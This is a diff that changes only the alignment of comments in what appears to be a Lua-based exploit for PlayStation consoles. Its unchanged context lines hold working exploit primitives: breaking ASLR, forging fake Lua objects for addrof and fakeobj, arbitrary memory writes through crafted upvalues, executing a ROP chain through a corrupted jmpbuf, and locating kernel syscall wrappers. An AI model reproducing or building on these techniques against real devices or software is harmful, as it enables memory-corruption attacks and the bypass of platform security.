@@ -962,8 +962,8 @@ function lua.setup_primitives()
     lua.write_upval = load_bytecode(write_upval_bc)
 
     lua.setup_initial_read_primitive() -- one small step
-    lua.resolve_address()              -- break aslr and resolve offsets
-    lua.setup_victim_table()           -- setup better addrof primitive
+    lua.resolve_address() -- break aslr and resolve offsets
+    lua.setup_victim_table() -- setup better addrof primitive
 end
 
 -- allocate a limited length string with a known address
@@ -1016,7 +1016,7 @@ function lua.fakeobj(fake_obj_addr, ttype)
     local addr, fake_tvalues, fake_proto, fake_closure
     fake_tvalues, addr = lua.create_str(ub8(fake_obj_addr) .. ub8(ttype)) -- value + ttype
     fake_proto, addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(addr))  -- next + tt/marked + k
-    fake_closure, _ = lua.create_str(ub8(0x0) .. ub8(addr))               -- env + proto
+    fake_closure, _ = lua.create_str(ub8(0x0) .. ub8(addr)) -- env + proto
     return lua.fakeobj_closure(fake_closure)
 end
 
@@ -1188,7 +1188,7 @@ end
 -- write 8 bytes (double) at target address with 4 bytes corruption
 function lua.write_double(addr, value)
     local fake_upval = ub8(0x0) ..
-    ub8(0x0) .. ub8(addr)                                                                     -- next + tt/marked + addr to tvalue
+    ub8(0x0) .. ub8(addr) -- next + tt/marked + addr to tvalue
     local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.addrof(fake_upval) + 24) -- env + proto + upvals
     lua.write_upval(fake_closure, value)
 end
@@ -1701,7 +1701,7 @@ function ropchain:execute_rop()
         lua.write_qword(jmpbuf_addr + 0, gadgets["ret"])   -- rip
         lua.write_qword(jmpbuf_addr + 16, self.stack_base) -- rsp
 
-        assert(false)                                      -- trigger exception
+        assert(false) -- trigger exception
     end
 
     -- run ropchain
@@ -1867,7 +1867,7 @@ function syscall.init()
             local num = uint64.unpack(libkernel_text:sub(offset + 3, offset + 6))
             syscall.syscall_wrapper[num:tonumber()] = libkernel_base + offset - 1
         end
-    elseif PLATFORM == "ps5" then                      -- can be any syscall wrapper in libkernel
+    elseif PLATFORM == "ps5" then  -- can be any syscall wrapper in libkernel
         local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
         syscall_rop.syscall_address = gettimeofday + 7 -- +7 is to skip "mov rax, <num>" instruction
         WRITE_ADDR = syscall_rop.syscall_address
